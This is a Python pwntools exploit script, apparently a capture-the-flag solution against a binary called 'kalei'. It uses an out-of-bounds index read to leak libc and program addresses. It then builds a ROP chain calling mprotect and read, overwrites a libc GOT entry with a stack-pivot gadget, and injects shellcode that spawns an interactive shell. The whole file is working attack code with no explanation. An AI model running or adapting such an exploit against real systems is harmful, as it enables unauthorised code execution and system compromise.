#!/usr/bin/python3
from pwn import *

if args.REMOTE:
    sla = lambda delim, data: p.sendlineafter(delim, data, timeout=3)
    sa = lambda delim, data: p.sendafter(delim, data, timeout=3)
    s = lambda data: p.send(data)
    sl = lambda data: p.sendline(data)
    r = lambda nbytes: p.recv(nbytes, timeout=3)
    ru = lambda data: p.recvuntil(data, timeout=3)
    rl = lambda : p.recvline(timeout=3)
else:
    sla = lambda delim, data: p.sendlineafter(delim, data)
    sa = lambda delim, data: p.sendafter(delim, data)
    s = lambda data: p.send(data)
    sl = lambda data: p.sendline(data)
    r = lambda nbytes: p.recv(nbytes)
    ru = lambda data: p.recvuntil(data)
    rl = lambda : p.recvline()


elf = context.binary = ELF('kalei', checksec=False)
libc = ELF('libc.so.6', checksec=False)
base = None
def int_from_bytes(bytes):
    return int.from_bytes(bytes, byteorder='little')
def get_exe_base(pid):
    maps_file = f"/proc/{pid}/maps"
    exe_base = None

    with open(maps_file, 'r') as f:
        exe_base = int(f.readline().split('-')[0], 16)

    if exe_base is None:
        raise Exception("Executable base address not found.")
    
    return exe_base

def GDB(proc):
    if not args.REMOTE:
        gdb.attach(p, gdbscript=f'''
                   #b *(view_data + 94)
                   b *(add_data + 128)
                    c
                    ''')
def create_data(size, data, index):
    sla(b'>> ', b'1')
    sla(B'Index: ', str(index).encode())
    sla(B'Size: ', str(size).encode())
    sa(b'Data: ', data)
def read_data(index):
    sla(b'>> ', b'2')
    sla(b'Index: ', str(index).encode())
def delete_data(index):
    sla(b'>> ', b'3')
    sla(b'Index: ', str(index).encode())
    

if args.REMOTE:
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process()
    #base = get_exe_base(p.pid)
context.log_level = 'debug'
read_data(-0x47)
ru(B'Your data: ')
r(0x18)
leak = r(8)
leak = int_from_bytes(leak)
print('leak: ', hex(leak))
libc.address = leak - 0x80e50
print('libc: ', hex(libc.address))

r(0x88)
leak = r(8)
leak = int_from_bytes(leak)
print('leak: ', hex(leak))
elf.address = leak - 0x4008
print('elf: ', hex(elf.address))

got = libc.address + 0x219098

MOV_RSP_RDX = libc.address + 0x000000000005a120 #: mov rsp, rdx ; ret

rop = ROP(libc)
rop.mprotect(elf.got['puts'] & ~0xfff, 0x2000, 7)
rop.read(0, elf.sym['sizes'] + 0x500, 0x1000)
rop.raw(elf.sym['sizes'] + 0x500)

for i in range(0, len(rop.chain()), 8):
    create_data(u64(rop.chain()[i:i+8]), b'A', i // 8)


create_data(got, b'A', 0x3b)
create_data(0x5000, b'A', 0x3a)


#GDB(p)

create_data(0x5000, p64(MOV_RSP_RDX), 40)

shell = shellcraft.sh()
s(bytes(asm(shell)))


p.interactive()